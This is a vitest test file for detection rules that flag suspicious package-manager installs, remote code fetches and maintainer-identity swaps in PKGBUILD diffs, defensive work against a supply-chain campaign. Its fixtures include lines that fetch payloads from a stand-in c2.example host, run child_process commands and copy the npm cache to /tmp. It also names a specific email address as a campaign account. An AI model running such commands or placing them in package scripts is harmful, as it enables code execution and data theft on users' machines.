import { describe, expect, it } from 'vitest';
import { CAMPAIGN_RULES } from './campaign.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('campaign rules', () => {
  it.each([
    ['NPM-001', 'npm install atomic-lockfile'],
    ['NPM-001', 'npm install -g evilpkg'],
    ['NPM-001', 'npm i -g evilpkg'],
    ['NPM-001', 'bun install js-digest'],
    ['NPM-001', 'yarn add left-pad'],
    ['NPM-001', 'npx -y evilpkg'],
    ['NPM-002', 'npm install atomic-lockfile'],
    ['NPM-002', 'bun install lockfile-js'],
    ['CAUR-NPM-CACHE', 'cp -r ~/.npm/_cacache /tmp/cache'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(CAMPAIGN_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('scopes package manager installs to PKGBUILD and install scriptlets', () => {
    const pkgbuild = makeChange(addedOnlyDiff(['npm install atomic-lockfile']), { new_path: 'foo/PKGBUILD' });
    const install = makeChange(addedOnlyDiff(['npm install atomic-lockfile']), { new_path: 'foo/foo.install' });
    const script = makeChange(addedOnlyDiff(['npm install atomic-lockfile']), { new_path: 'foo/build.sh' });

    expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(pkgbuild)).not.toBeNull();
    expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(install)).not.toBeNull();
    expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(script)).toBeNull();

    for (const id of ['CAUR-NODE-EVAL', 'CAUR-NODE-CHILD-PROCESS', 'CAUR-DENO-FETCH']) {
      expect(ruleById(CAMPAIGN_RULES, id).check(script)).toBeNull();
      expect(ruleById(CAMPAIGN_RULES, id).check(pkgbuild)).toBeNull();
    }
  });

  it.each([
    ['CAUR-NODE-EVAL', "node -e \"require('http').get('http://c2.example')\""],
    ['CAUR-NODE-EVAL', 'node --eval payload.js'],
    ['CAUR-NODE-CHILD-PROCESS', 'node -e "require(\'child_process\').execSync(curl)"'],
    ['CAUR-NODE-CHILD-PROCESS', 'const { execSync } = require("child_process");'],
    ['CAUR-DENO-FETCH', 'deno install -n x https://c2.example/payload.ts'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(CAMPAIGN_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('does not flag unrelated npm usage', () => {
    const change = makeChange(addedOnlyDiff(['npm run build', 'npm ci', 'npm install --omit=dev', 'npm install \\']));
    expect(ruleById(CAMPAIGN_RULES, 'NPM-001').check(change)).toBeNull();
  });

  it('flags swapped maintainer emails but not legitimate promotions', () => {
    const swap = makeChange(
      [
        '@@ -1,3 +1,3 @@',
        '-# Maintainer: Jane <jane@old.example>',
        '+# Maintainer: Jane <jane@new.example>',
        ' pkgname=x',
      ].join('\n'),
      { new_path: 'foo/PKGBUILD' },
    );
    expect(ruleById(CAMPAIGN_RULES, 'CAUR-IDENTITY-SWAP').check(swap)).not.toBeNull();

    const promotion = makeChange(
      [
        '@@ -1,3 +1,4 @@',
        ' # Maintainer: Jane <jane@example.org>',
        '+# Contributor: Jane <jane@example.org>',
        ' pkgname=x',
      ].join('\n'),
      { new_path: 'foo/PKGBUILD' },
    );
    expect(ruleById(CAMPAIGN_RULES, 'CAUR-IDENTITY-SWAP').check(promotion)).toBeNull();
  });

  it('flags known campaign account emails in PKGBUILDs', () => {
    const change = makeChange(addedOnlyDiff(['# Maintainer: Jane <krisztinavarga@gmail.com>']), {
      new_path: 'foo/PKGBUILD',
    });
    expect(ruleById(CAMPAIGN_RULES, 'CAUR-CAMPAIGN-ACCOUNT').check(change)).not.toBeNull();
  });
});
